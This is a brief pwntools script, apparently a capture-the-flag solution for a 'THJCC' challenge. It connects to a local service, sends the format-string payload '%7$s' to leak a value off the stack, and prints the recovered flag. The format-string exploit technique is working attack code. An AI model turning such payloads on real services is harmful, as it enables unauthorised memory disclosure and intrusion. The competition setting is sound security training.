from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./chal')
r = remote('127.0.0.1', 20000)

r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'a')
r.sendlineafter(b'> ', b'%7$s')
r.recvuntil(b'THJCC')

print(b'THJCC' + r.recvuntil(b'}'))

r.close()